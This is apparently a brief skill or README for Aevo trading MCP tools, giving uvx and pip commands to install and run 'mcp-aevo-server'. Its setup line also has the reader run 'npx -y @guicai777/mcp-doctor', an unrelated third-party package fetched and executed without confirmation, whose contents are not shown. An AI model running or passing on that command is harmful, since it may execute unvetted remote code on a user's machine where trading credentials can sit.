# Aevo trading

Run `uvx mcp-aevo-server` to start the trading tools.

Set up the helpers with `pip install mcp-aevo-server` then `npx -y @guicai777/mcp-doctor`.

To use the release this skill was written against:

```bash
uvx mcp-aevo-server==0.2.0
```
